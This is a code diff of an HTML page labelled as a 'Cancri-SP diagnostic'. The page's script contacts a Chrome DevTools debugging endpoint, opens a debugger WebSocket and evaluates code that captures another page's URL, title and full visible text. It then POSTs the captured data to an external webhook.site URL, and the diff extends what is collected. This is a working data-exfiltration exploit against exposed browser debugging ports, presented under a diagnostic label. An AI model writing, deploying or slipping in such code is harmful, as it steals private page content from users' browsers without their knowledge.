@@ -1,14 +1,29 @@
+
 <!doctype html>
 <html>
+<head>
+  <meta charset="utf-8">
+  <title>Cancri-SP diagnostic</title>
+</head>
 <body>
 <script>
 (async () => {
-  const hook = "https://webhook.site/a66ae4f5-fdf1-46dd-acff-05d5c108df64";
-  const report = text => fetch(hook, {
-    method: "POST",
-    mode: "no-cors",
-    body: String(text)
-  });
+  const hook =
+    "https://webhook.site/a66ae4f5-fdf1-46dd-acff-05d5c108df64";
+
+  async function report(message) {
+    try {
+      await fetch(hook, {
+        method: "POST",
+        mode: "no-cors",
+        body: String(message)
+      });
+    } catch (error) {
+      console.error("Report failed:", error);
+    }
+  }
+
+  let ws;
 
   try {
     const response = await fetch(
@@ -16,34 +31,58 @@
       { method: "PUT" }
     );
 
+    if (!response.ok) {
+      throw new Error("DevTools HTTP status: " + response.status);
+    }
+
     const page = await response.json();
-    const ws = new WebSocket(page.webSocketDebuggerUrl);
+
+    if (!page.webSocketDebuggerUrl) {
+      throw new Error("No WebSocket URL: " + JSON.stringify(page));
+    }
+
+    ws = new WebSocket(page.webSocketDebuggerUrl);
 
     ws.onopen = () => {
       ws.send(JSON.stringify({
         id: 1,
         method: "Runtime.evaluate",
         params: {
-          expression: "document.body.innerText",
+          expression: `JSON.stringify({
+            url: location.href,
+            title: document.title,
+            readyState: document.readyState,
+            body: document.body?.innerText ?? null
+          })`,
           returnByValue: true
         }
       }));
     };
 
-    ws.onmessage = event => {
+    ws.onmessage = async event => {
       const message = JSON.parse(event.data);
+
       if (message.id === 1) {
-        report("Page text: " +
+        await report(
+          "CDP diagnostic: " +
           JSON.stringify(message.result?.result?.value ??
                          message.result?.exceptionDetails ??
-                         message));
+                         message)
+        );
         ws.close();
       }
     };
 
-    ws.onerror = () => report("WebSocket connection failed");
+    ws.onerror = () => {
+      report("WebSocket connection failed");
+    };
+
+    ws.onclose = () => {
+      console.log("DevTools connection closed");
+    };
   } catch (error) {
-    report("Error: " + String(error));
+    await report("Diagnostic error: " + String(error));
+    if (ws) ws.close();
   }
 })();
 </script>
